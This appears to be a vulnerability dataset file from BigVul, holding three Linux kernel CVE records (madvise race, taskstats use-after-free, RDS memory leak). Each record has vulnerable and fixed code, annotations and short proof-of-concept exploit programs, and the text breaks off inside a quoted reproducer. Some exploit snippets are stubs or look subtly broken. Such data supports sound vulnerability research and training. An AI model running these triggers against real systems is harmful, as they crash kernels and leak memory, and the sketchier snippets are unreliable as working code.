[
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3511",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "mm/madvise.c": "static long madvise_remove(struct vm_area_struct *vma,\n\t\t\t\tstruct vm_area_struct **prev,\n\t\t\t\tunsigned long start, unsigned long end)\n {\n \tloff_t offset;\n \tint error;\n \n \t*prev = NULL;\t/* tell sys_madvise we drop mmap_sem */\n \n \tif (vma->vm_flags & (VM_LOCKED|VM_NONLINEAR|VM_HUGETLB))\n \t\treturn -EINVAL;\n \n\tif (!vma->vm_file || !vma->vm_file->f_mapping\n\t\t|| !vma->vm_file->f_mapping->host) {\n \t\t\treturn -EINVAL;\n \t}\n \n\tif ((vma->vm_flags & (VM_SHARED|VM_WRITE)) != (VM_SHARED|VM_WRITE))\n\t\treturn -EACCES;\n\n \toffset = (loff_t)(start - vma->vm_start)\n \t\t\t+ ((loff_t)vma->vm_pgoff << PAGE_SHIFT);\n \n\t/* filesystem's fallocate may need to take i_mutex */\n \tup_read(&current->mm->mmap_sem);\n\terror = do_fallocate(vma->vm_file,\n \t\t\t\tFALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,\n \t\t\t\toffset, end - start);\n \tdown_read(&current->mm->mmap_sem);\n \treturn error;\n }\n"
        },
        "vulnerabilities": "Multiple race conditions in the madvise_remove function in mm/madvise.c in the Linux kernel before 3.4.5 allow local users to cause a denial of service (use-after-free and system crash) via vectors involving a (1) munmap or (2) close system call.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3511\n\n[Mandatory] Title: CVE-2012-3511 / CWE-362:\nLinux kernel madvise_remove race condition\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-23\n\n[Optional] Affected products/versions:\nLinux kernel before 3.4.5\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-362 - Race Condition\n[Mandatory] Summary:\nThe madvise_remove function in mm/madvise.c contains multiple race conditions that allow local users to cause a denial of service (use-after-free and system crash) via vectors involving munmap or close system calls. The vulnerability occurs when the function drops mmap_sem semaphore before file operations without properly maintaining a reference to the file.\n[Mandatory] Root cause:\nRace condition due to lack of file reference maintenance during critical section where mmap_sem is released.\n[Mandatory] Attack Surface:\nLinux kernel memory management subsystem (madvise system call)\n[Mandatory] Impact Summary:\nLocal Denial of Service (system crash)\n[Optional] Trigger / Attack vector:\nConcurrent munmap or close system calls\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nup_read(&current->mm->mmap_sem);\nerror = do_fallocate(vma->vm_file,\n\t\tFALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,\n\t\toffset, end - start);\ndown_read(&current->mm->mmap_sem);\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nmadvise system call handler (memory management interface)\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free of file or vma structures\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal attackers can crash the system by racing munmap/close calls with madvise_remove operations.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create memory mapping with madvise(MADV_REMOVE)\n- In parallel thread:\n  - Call munmap on the same mapping\n  - Or close the underlying file descriptor\n- Causes use-after-free when madvise_remove proceeds with freed resources\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <pthread.h>\n#include <unistd.h>\n\nvoid* thread_func(void* arg) {\n    munmap(arg, 4096);\n    // or: close(*(int*)arg);\n    return NULL;\n}\n\nint main() {\n    int fd = open(\"/tmp/test\", O_RDWR|O_CREAT, 0644);\n    void* addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);\n    \n    pthread_t tid;\n    pthread_create(&tid, NULL, thread_func, addr);\n    \n    madvise(addr, 4096, MADV_REMOVE);\n    pthread_join(tid, NULL);\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nf = vma->vm_file;\nget_file(f);\nup_read(&current->mm->mmap_sem);\nerror = do_fallocate(f,\n\t\tFALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,\n\t\toffset, end - start);\nfput(f);\ndown_read(&current->mm->mmap_sem);\n```\n\n[Mandatory] Fix summary:\nAdded reference counting for the file structure by using get_file/fput to prevent use-after-free during the critical section.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/9ab4233dd08036fe34a89c7dc6f47a8bf2eb29eb\n\n[Optional] Patch Analysis:\nField: PatchType: Reference counting added\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other madvise operation handlers for similar race conditions\n- Check for similar patterns in other subsystems that drop locks while operating on file references\n\n[Optional] Likely variants/impact (one line):\nOther file operations that temporarily release mmap_sem may be vulnerable to similar races.",
        "tests": "NA",
        "solutions": "static long madvise_remove(struct vm_area_struct *vma,\n\t\t\t\tstruct vm_area_struct **prev,\n\t\t\t\tunsigned long start, unsigned long end)\n {\n \tloff_t offset;\n \tint error;\n\tstruct file *f;\n \n \t*prev = NULL;\t/* tell sys_madvise we drop mmap_sem */\n \n \tif (vma->vm_flags & (VM_LOCKED|VM_NONLINEAR|VM_HUGETLB))\n \t\treturn -EINVAL;\n \n\tf = vma->vm_file;\n\n\tif (!f || !f->f_mapping || !f->f_mapping->host) {\n \t\t\treturn -EINVAL;\n \t}\n \n\tif ((vma->vm_flags & (VM_SHARED|VM_WRITE)) != (VM_SHARED|VM_WRITE))\n\t\treturn -EACCES;\n\n \toffset = (loff_t)(start - vma->vm_start)\n \t\t\t+ ((loff_t)vma->vm_pgoff << PAGE_SHIFT);\n \n\t/*\n\t * Filesystem's fallocate may need to take i_mutex.  We need to\n\t * explicitly grab a reference because the vma (and hence the\n\t * vma's reference to the file) can go away as soon as we drop\n\t * mmap_sem.\n\t */\n\tget_file(f);\n \tup_read(&current->mm->mmap_sem);\n\terror = do_fallocate(f,\n \t\t\t\tFALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,\n \t\t\t\toffset, end - start);\n\tfput(f);\n \tdown_read(&current->mm->mmap_sem);\n \treturn error;\n }\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-23",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/9ab4233dd08036fe34a89c7dc6f47a8bf2eb29eb",
        "commit_id": "9ab4233dd08036fe34a89c7dc6f47a8bf2eb29eb",
        "commit_message": "mm: Hold a file reference in madvise_remove\n\nOtherwise the code races with munmap (causing a use-after-free\nof the vma) or with close (causing a use-after-free of the struct\nfile).\n\nThe bug was introduced by commit 90ed52ebe481 (\"[PATCH] holepunch: fix\nmmap_sem i_mutex deadlock\")\n\nCc: Hugh Dickins <hugh@veritas.com>\nCc: Miklos Szeredi <mszeredi@suse.cz>\nCc: Badari Pulavarty <pbadari@us.ibm.com>\nCc: Nick Piggin <npiggin@suse.de>\nCc: stable@vger.kernel.org\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-3510",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "kernel/tsacct.c": " void xacct_add_tsk(struct taskstats *stats, struct task_struct *p)\n {\n \t/* convert pages-jiffies to Mbyte-usec */\n \tstats->coremem = jiffies_to_usecs(p->acct_rss_mem1) * PAGE_SIZE / MB;\n \tstats->virtmem = jiffies_to_usecs(p->acct_vm_mem1) * PAGE_SIZE / MB;\n\tif (p->mm) {\n \t\t/* adjust to KB unit */\n\t\tstats->hiwater_rss   = p->mm->hiwater_rss * PAGE_SIZE / KB;\n\t\tstats->hiwater_vm    = p->mm->hiwater_vm * PAGE_SIZE / KB;\n \t}\n \tstats->read_char\t= p->rchar;\n \tstats->write_char\t= p->wchar;\n\tstats->read_syscalls\t= p->syscr;\n\tstats->write_syscalls\t= p->syscw;\n}\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the xacct_add_tsk function in kernel/tsacct.c in the Linux kernel before 2.6.19 allows local users to obtain potentially sensitive information from kernel memory or cause a denial of service (system crash) via a taskstats TASKSTATS_CMD_ATTR_PID command.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3510\n\n[Mandatory] Title: CVE-2012-3510 / CWE-399:\nUse-after-free in Linux kernel taskstats\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-04-18\n\n[Optional] Affected products/versions:\nLinux kernel before 2.6.19\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors - Use-after-free\n[Mandatory] Summary:\nThe vulnerability exists in the xacct_add_tsk function in kernel/tsacct.c where a task could free its memory management structure after the 'if (p->mm)' check, leading to a use-after-free condition. This could allow local users to read sensitive information from kernel memory or cause a system crash via a taskstats TASKSTATS_CMD_ATTR_PID command.\n[Mandatory] Root cause:\nThe function accesses p->mm after an initial check without proper locking or reference counting, allowing the memory to be freed between the check and use.\n[Mandatory] Attack Surface:\nLinux kernel taskstats interface (local)\n[Mandatory] Impact Summary:\nInformation disclosure or system crash (Denial of Service)\n[Optional] Trigger / Attack vector:\nTASKSTATS_CMD_ATTR_PID command via taskstats interface\n[Mandatory] Key code/struct excerpt (minimal):\nvoid xacct_add_tsk(struct taskstats *stats, struct task_struct *p)\n{\n    /* convert pages-jiffies to Mbyte-usec */\n    stats->coremem = jiffies_to_usecs(p->acct_rss_mem1) * PAGE_SIZE / MB;\n    stats->virtmem = jiffies_to_usecs(p->acct_vm_mem1) * PAGE_SIZE / MB;\n    if (p->mm) {\n        /* adjust to KB unit */\n        stats->hiwater_rss   = p->mm->hiwater_rss * PAGE_SIZE / KB;\n        stats->hiwater_vm    = p->mm->hiwater_vm * PAGE_SIZE / KB;\n    }\n}\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nKernel taskstats interface (TASKSTATS_CMD_ATTR_PID command)\n\n[Mandatory] Exploit primitive(s) available:\nMemory read of freed kernel memory\n\n[Mandatory] Exploitability summary (1 sentence):\nLocal attackers can trigger the use-after-free via taskstats commands but require precise timing to exploit successfully.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Opens taskstats interface\n- Sends TASKSTATS_CMD_ATTR_PID command targeting own process\n- Repeatedly frees and reallocates process mm_struct\n- Attempts to race between check and use of p->mm\n- Reads returned stats to check for kernel memory leaks\n\n[Mandatory] Exploitation Example script payload code:\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <linux/taskstats.h>\n\nint main() {\n    int fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC);\n    struct taskstats stats;\n    // Setup taskstats attributes and commands\n    while (1) {\n        // Free mm_struct in parallel thread\n        // Send taskstats command to read own stats\n        // Attempt to trigger use-after-free\n    }\n    return 0;\n}\n\nFix\n[Mandatory] Fix code:\nvoid xacct_add_tsk(struct taskstats *stats, struct task_struct *p)\n{\n    struct mm_struct *mm;\n\n    /* convert pages-jiffies to Mbyte-usec */\n    stats->coremem = jiffies_to_usecs(p->acct_rss_mem1) * PAGE_SIZE / MB;\n    stats->virtmem = jiffies_to_usecs(p->acct_vm_mem1) * PAGE_SIZE / MB;\n    mm = get_task_mm(p);\n    if (mm) {\n        /* adjust to KB unit */\n        stats->hiwater_rss   = mm->hiwater_rss * PAGE_SIZE / KB;\n        stats->hiwater_vm    = mm->hiwater_vm * PAGE_SIZE / KB;\n        mmput(mm);\n    }\n}\n\n[Mandatory] Fix summary:\nThe fix adds proper reference counting using get_task_mm() and mmput() to ensure the mm_struct remains valid during access.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9\n\n[Optional] Patch Analysis:\nField: PatchType (e.g., bounds check added, logic refactor, feature removal)\nReference counting added to prevent use-after-free\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other taskstats command handlers\n- Check for similar mm_struct access patterns\n- Audit other kernel accounting interfaces\n\n[Optional] Likely variants/impact (one line):\nOther kernel accounting interfaces may have similar race conditions",
        "tests": "NA",
        "solutions": " void xacct_add_tsk(struct taskstats *stats, struct task_struct *p)\n {\n\tstruct mm_struct *mm;\n\n \t/* convert pages-jiffies to Mbyte-usec */\n \tstats->coremem = jiffies_to_usecs(p->acct_rss_mem1) * PAGE_SIZE / MB;\n \tstats->virtmem = jiffies_to_usecs(p->acct_vm_mem1) * PAGE_SIZE / MB;\n\tmm = get_task_mm(p);\n\tif (mm) {\n \t\t/* adjust to KB unit */\n\t\tstats->hiwater_rss   = mm->hiwater_rss * PAGE_SIZE / KB;\n\t\tstats->hiwater_vm    = mm->hiwater_vm * PAGE_SIZE / KB;\n\t\tmmput(mm);\n \t}\n \tstats->read_char\t= p->rchar;\n \tstats->write_char\t= p->wchar;\n\tstats->read_syscalls\t= p->syscr;\n\tstats->write_syscalls\t= p->syscw;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-04-18",
        "Vulnerability type": "DoS +Info ",
        "commit_url": "https://github.com/torvalds/linux/commit/f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9",
        "commit_id": "f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9",
        "commit_message": "[PATCH] xacct_add_tsk: fix pure theoretical ->mm use-after-free\n\nParanoid fix. The task can free its ->mm after the 'if (p->mm)' check.\n\nSigned-off-by: Oleg Nesterov <oleg@tv-sign.ru>\nCc: Shailabh Nagar <nagar@watson.ibm.com>\nCc: Balbir Singh <balbir@in.ibm.com>\nCc: Jay Lan <jlan@sgi.com>\nSigned-off-by: Andrew Morton <akpm@osdl.org>\nSigned-off-by: Linus Torvalds <torvalds@osdl.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-200",
        "CVE": "CVE-2012-3430",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/rds/recv.c": "int rds_recvmsg(struct kiocb *iocb, struct socket *sock, struct msghdr *msg,\n\t\tsize_t size, int msg_flags)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct rds_sock *rs = rds_sk_to_rs(sk);\n\tlong timeo;\n\tint ret = 0, nonblock = msg_flags & MSG_DONTWAIT;\n\tstruct sockaddr_in *sin;\n\tstruct rds_incoming *inc = NULL;\n\n\t/* udp_recvmsg()->sock_recvtimeo() gets away without locking too.. */\n\ttimeo = sock_rcvtimeo(sk, nonblock);\n \n \trdsdebug(\"size %zu flags 0x%x timeo %ld\\n\", size, msg_flags, timeo);\n \n \tif (msg_flags & MSG_OOB)\n \t\tgoto out;\n \n\twhile (1) {\n\t\t/* If there are pending notifications, do those - and nothing else */\n\t\tif (!list_empty(&rs->rs_notify_queue)) {\n\t\t\tret = rds_notify_queue_get(rs, msg);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (rs->rs_cong_notify) {\n\t\t\tret = rds_notify_cong(rs, msg);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (!rds_next_incoming(rs, &inc)) {\n\t\t\tif (nonblock) {\n\t\t\t\tret = -EAGAIN;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\ttimeo = wait_event_interruptible_timeout(*sk_sleep(sk),\n\t\t\t\t\t(!list_empty(&rs->rs_notify_queue) ||\n\t\t\t\t\t rs->rs_cong_notify ||\n\t\t\t\t\t rds_next_incoming(rs, &inc)), timeo);\n\t\t\trdsdebug(\"recvmsg woke inc %p timeo %ld\\n\", inc,\n\t\t\t\t timeo);\n\t\t\tif (timeo > 0 || timeo == MAX_SCHEDULE_TIMEOUT)\n\t\t\t\tcontinue;\n\n\t\t\tret = timeo;\n\t\t\tif (ret == 0)\n\t\t\t\tret = -ETIMEDOUT;\n\t\t\tbreak;\n\t\t}\n\n\t\trdsdebug(\"copying inc %p from %pI4:%u to user\\n\", inc,\n\t\t\t &inc->i_conn->c_faddr,\n\t\t\t ntohs(inc->i_hdr.h_sport));\n\t\tret = inc->i_conn->c_trans->inc_copy_to_user(inc, msg->msg_iov,\n\t\t\t\t\t\t\t     size);\n\t\tif (ret < 0)\n\t\t\tbreak;\n\n\t\t/*\n\t\t * if the message we just copied isn't at the head of the\n\t\t * recv queue then someone else raced us to return it, try\n\t\t * to get the next message.\n\t\t */\n\t\tif (!rds_still_queued(rs, inc, !(msg_flags & MSG_PEEK))) {\n\t\t\trds_inc_put(inc);\n\t\t\tinc = NULL;\n\t\t\trds_stats_inc(s_recv_deliver_raced);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (ret < be32_to_cpu(inc->i_hdr.h_len)) {\n\t\t\tif (msg_flags & MSG_TRUNC)\n\t\t\t\tret = be32_to_cpu(inc->i_hdr.h_len);\n\t\t\tmsg->msg_flags |= MSG_TRUNC;\n\t\t}\n\n\t\tif (rds_cmsg_recv(inc, msg)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\n\t\trds_stats_inc(s_recv_delivered);\n\n\t\tsin = (struct sockaddr_in *)msg->msg_name;\n\t\tif (sin) {\n\t\t\tsin->sin_family = AF_INET;\n \t\t\tsin->sin_port = inc->i_hdr.h_sport;\n \t\t\tsin->sin_addr.s_addr = inc->i_saddr;\n \t\t\tmemset(sin->sin_zero, 0, sizeof(sin->sin_zero));\n \t\t}\n \t\tbreak;\n \t}\n\n\tif (inc)\n\t\trds_inc_put(inc);\n\nout:\n\treturn ret;\n}\n"
        },
        "vulnerabilities": "The rds_recvmsg function in net/rds/recv.c in the Linux kernel before 3.0.44 does not initialize a certain structure member, which allows local users to obtain potentially sensitive information from kernel stack memory via a (1) recvfrom or (2) recvmsg system call on an RDS socket.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3430\n\n[Mandatory] Title: CVE-2012-3430 / CWE-200:\nUninitialized kernel memory disclosure via RDS socket\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-04-18\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0.44\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-200: Information Exposure\n[Mandatory] Summary:\nThe rds_recvmsg function in the Linux kernel fails to properly initialize the msg_namelen member of a socket structure before returning from recvfrom/recvmsg system calls. This allows local users to read uninitialized kernel stack memory via a crafted RDS socket message with an incorrectly large address length parameter.\n[Mandatory] Root cause:\nUninitialized msg_namelen field in socket structure returned to userspace.\n[Mandatory] Attack Surface:\nLocal userspace applications making recvfrom/recvmsg system calls on RDS sockets.\n[Mandatory] Impact Summary:\nKernel memory information disclosure\n[Optional] Trigger / Attack vector:\nrecvfrom or recvmsg system call with improper msg_namelen\n[Mandatory] Key code/struct excerpt (minimal):\n        sin = (struct sockaddr_in *)msg->msg_name;\n        if (sin) {\n        sin->sin_family = AF_INET;\n        sin->sin_port = inc->i_hdr.h_sport;\n        sin->sin_addr.s_addr = inc->i_saddr;\n        memset(sin->sin_zero, 0, sizeof(sin->sin_zero));\n        }\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nRDS socket system calls (recvfrom/recvmsg)\n\n[Mandatory] Exploit primitive(s) available:\nKernel memory read via uninitialized struct field\n\n[Mandatory] Exploitability summary (1 sentence):\nLocally exploitable by calling recvmsg() with a deliberately misconfigured msg_namelen parameter.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create RDS socket and bind to address\n- Configure msghdr with oversized msg_namelen\n- Call recvmsg() to trigger vulnerability\n- Kernel copies uninitialized memory to userspace\n- Possible to obtain 128 bytes of kernel memory\n\n[Mandatory] Exploitation Example script payload code:\nint main(void) {\n    int sock_fd;\n    struct sockaddr_in fromAddr;\n    struct msghdr msg;\n    char recvBuffer[128];\n    \n    sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);\n    msg.msg_name = &fromAddr;\n    msg.msg_namelen = sizeof(fromAddr) + 16; // Deliberately oversized\n    msg.msg_iov->iov_base = recvBuffer;\n    msg.msg_iov->iov_len = 128;\n    recvmsg(sock_fd, &msg, 0);\n}\n\nFix\n[Mandatory] Fix code:\n        sin = (struct sockaddr_in *)msg->msg_name;\n        if (sin) {\n        sin->sin_family = AF_INET;\n        sin->sin_port = inc->i_hdr.h_sport;\n        sin->sin_addr.s_addr = inc->i_saddr;\n        memset(sin->sin_zero, 0, sizeof(sin->sin_zero));\n        msg->msg_namelen = sizeof(*sin);\n        }\n\n[Mandatory] Fix summary:\nAdded proper initialization of msg_namelen field to prevent kernel memory leak.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/06b6a1cf6e776426766298d055bb3991957d90a7\n\n[Optional] Patch Analysis:\nField: PatchType: Missing initialization added\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other socket-related recvmsg implementations\n- Check for similar uninitialized struct returns in kernel\n\n[Optional] Likely variants/impact (one line):\nOther socket implementations may have similar uninitialized return value issues.",
        "tests": "NA",
        "solutions": "int rds_recvmsg(struct kiocb *iocb, struct socket *sock, struct msghdr *msg,\n\t\tsize_t size, int msg_flags)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct rds_sock *rs = rds_sk_to_rs(sk);\n\tlong timeo;\n\tint ret = 0, nonblock = msg_flags & MSG_DONTWAIT;\n\tstruct sockaddr_in *sin;\n\tstruct rds_incoming *inc = NULL;\n\n\t/* udp_recvmsg()->sock_recvtimeo() gets away without locking too.. */\n\ttimeo = sock_rcvtimeo(sk, nonblock);\n \n \trdsdebug(\"size %zu flags 0x%x timeo %ld\\n\", size, msg_flags, timeo);\n \n\tmsg->msg_namelen = 0;\n\n \tif (msg_flags & MSG_OOB)\n \t\tgoto out;\n \n\twhile (1) {\n\t\t/* If there are pending notifications, do those - and nothing else */\n\t\tif (!list_empty(&rs->rs_notify_queue)) {\n\t\t\tret = rds_notify_queue_get(rs, msg);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (rs->rs_cong_notify) {\n\t\t\tret = rds_notify_cong(rs, msg);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (!rds_next_incoming(rs, &inc)) {\n\t\t\tif (nonblock) {\n\t\t\t\tret = -EAGAIN;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\ttimeo = wait_event_interruptible_timeout(*sk_sleep(sk),\n\t\t\t\t\t(!list_empty(&rs->rs_notify_queue) ||\n\t\t\t\t\t rs->rs_cong_notify ||\n\t\t\t\t\t rds_next_incoming(rs, &inc)), timeo);\n\t\t\trdsdebug(\"recvmsg woke inc %p timeo %ld\\n\", inc,\n\t\t\t\t timeo);\n\t\t\tif (timeo > 0 || timeo == MAX_SCHEDULE_TIMEOUT)\n\t\t\t\tcontinue;\n\n\t\t\tret = timeo;\n\t\t\tif (ret == 0)\n\t\t\t\tret = -ETIMEDOUT;\n\t\t\tbreak;\n\t\t}\n\n\t\trdsdebug(\"copying inc %p from %pI4:%u to user\\n\", inc,\n\t\t\t &inc->i_conn->c_faddr,\n\t\t\t ntohs(inc->i_hdr.h_sport));\n\t\tret = inc->i_conn->c_trans->inc_copy_to_user(inc, msg->msg_iov,\n\t\t\t\t\t\t\t     size);\n\t\tif (ret < 0)\n\t\t\tbreak;\n\n\t\t/*\n\t\t * if the message we just copied isn't at the head of the\n\t\t * recv queue then someone else raced us to return it, try\n\t\t * to get the next message.\n\t\t */\n\t\tif (!rds_still_queued(rs, inc, !(msg_flags & MSG_PEEK))) {\n\t\t\trds_inc_put(inc);\n\t\t\tinc = NULL;\n\t\t\trds_stats_inc(s_recv_deliver_raced);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (ret < be32_to_cpu(inc->i_hdr.h_len)) {\n\t\t\tif (msg_flags & MSG_TRUNC)\n\t\t\t\tret = be32_to_cpu(inc->i_hdr.h_len);\n\t\t\tmsg->msg_flags |= MSG_TRUNC;\n\t\t}\n\n\t\tif (rds_cmsg_recv(inc, msg)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\n\t\trds_stats_inc(s_recv_delivered);\n\n\t\tsin = (struct sockaddr_in *)msg->msg_name;\n\t\tif (sin) {\n\t\t\tsin->sin_family = AF_INET;\n \t\t\tsin->sin_port = inc->i_hdr.h_sport;\n \t\t\tsin->sin_addr.s_addr = inc->i_saddr;\n \t\t\tmemset(sin->sin_zero, 0, sizeof(sin->sin_zero));\n\t\t\tmsg->msg_namelen = sizeof(*sin);\n \t\t}\n \t\tbreak;\n \t}\n\n\tif (inc)\n\t\trds_inc_put(inc);\n\nout:\n\treturn ret;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-04-18",
        "Vulnerability type": "+Info ",
        "commit_url": "https://github.com/torvalds/linux/commit/06b6a1cf6e776426766298d055bb3991957d90a7",
        "commit_id": "06b6a1cf6e776426766298d055bb3991957d90a7",
        "commit_message": "rds: set correct msg_namelen\n\nJay Fenlason (fenlason@redhat.com) found a bug,\nthat recvfrom() on an RDS socket can return the contents of random kernel\nmemory to userspace if it was called with a address length larger than\nsizeof(struct sockaddr_in).\nrds_recvmsg() also fails to set the addr_len paramater properly before\nreturning, but that's just a bug.\nThere are also a number of cases wher recvfrom() can return an entirely bogus\naddress. Anything in rds_recvmsg() that returns a non-negative value but does\nnot go through the \"sin = (struct sockaddr_in *)msg->msg_name;\" code path\nat the end of the while(1) loop will return up to 128 bytes of kernel memory\nto userspace.\n\nAnd I write two test programs to reproduce this bug, you will see that in\nrds_server, fromAddr will be overwritten and the following sock_fd will be\ndestroyed.\nYes, it is the programmer's fault to set msg_namelen incorrectly, but it is\nbetter to make the kernel copy the real length of address to user space in\nsuch case.\n\nHow to run the test programs ?\nI test them on 32bit x86 system, 3.5.0-rc7.\n\n1 compile\ngcc -o rds_client rds_client.c\ngcc -o rds_server rds_server.c\n\n2 run ./rds_server on one console\n\n3 run ./rds_client on another console\n\n4 you will see something like:\nserver is waiting to receive data...\nold socket fd=3\nserver received data from client:data from client\nmsg.msg_namelen=32\nnew socket fd=-1067277685\nsendmsg()\n: Bad file descriptor\n\n/***************** rds_client.c ********************/\n\nint main(void)\n{\n\tint sock_fd;\n\tstruct sockaddr_in serverAddr;\n\tstruct sockaddr_in toAddr;\n\tchar recvBuffer[128] = \"data from client\";\n\tstruct msghdr msg;\n\tstruct iovec iov;\n\n\tsock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);\n\tif (sock_fd < 0) {\n\t\tperror(\"create socket error\\n\");\n\t\texit(1);\n\t}\n\n\tmemset(&serverAddr, 0, sizeof(serverAddr));\n\tserverAddr.sin_family = AF_INET;\n\tserverAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\tserverAddr.sin_port = htons(4001);\n\n\tif (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {\n\t\tperror(\"bind() error\\n\");\n\t\tclose(sock_fd);\n\t\texit(1);\n\t}\n\n\tmemset(&toAddr, 0, sizeof(toAddr));\n\ttoAddr.sin_family = AF_INET;\n\ttoAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\ttoAddr.sin_port = htons(4000);\n\tmsg.msg_name = &toAddr;\n\tmsg.msg_namelen = sizeof(toAddr);\n\tmsg.msg_iov = &iov;\n\tmsg.msg_iovlen = 1;\n\tmsg.msg_iov->iov_base = recvBuffer;\n\tmsg.msg_iov->iov_len = strlen(recvBuffer) + 1;\n\tmsg.msg_control = 0;\n\tmsg.msg_controllen = 0;\n\tmsg.msg_flags = 0;\n\n\tif (sendmsg(sock_fd, &msg, 0) == -1) {\n\t\tperror(\"sendto() error\\n\");\n\t\tclose(sock_fd);\n\t\texit(1);\n\t}\n\n\tprintf(\"client send data:%s\\n\", recvBuffer);\n\n\tmemset(recvBuffer, '\\0', 128);\n\n\tmsg.msg_name = &toAddr;\n\tmsg.msg_namelen = sizeof(toAddr);\n\tmsg.msg_iov = &iov;\n\tmsg.msg_iovlen = 1;\n\tmsg.msg_iov->iov_base = recvBuffer;\n\tmsg.msg_iov->iov_len = 128;\n\tmsg.msg_control = 0;\n\tmsg.msg_controllen = 0;\n\tmsg.msg_flags = 0;\n\tif (recvmsg(sock_fd, &msg, 0) == -1) {\n\t\tperror(\"recvmsg() error\\n\");\n\t\tclose(sock_fd);\n\t\texit(1);\n\t}\n\n\tprintf(\"receive data from server:%s\\n\", recvBuffer);\n\n\tclose(sock_fd);\n\n\treturn 0;\n}\n\n/***************** rds_server.c ********************/\n\nint main(void)\n{\n\tstruct sockaddr_in fromAddr;\n\tint sock_fd;\n\tstruct sockaddr_in serverAddr;\n\tunsigned int addrLen;\n\tchar recvBuffer[128];\n\tstruct msghdr msg;\n\tstruct iovec iov;\n\n\tsock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);\n\tif(sock_fd < 0) {\n\t\tperror(\"create socket error\\n\");\n\t\texit(0);\n\t}\n\n\tmemset(&serverAddr, 0, sizeof(serverAddr));\n\tserverAddr.sin_family = AF_INET;\n\tserverAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\tserverAddr.sin_port = htons(4000);\n\tif (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {\n\t\tperror(\"bind 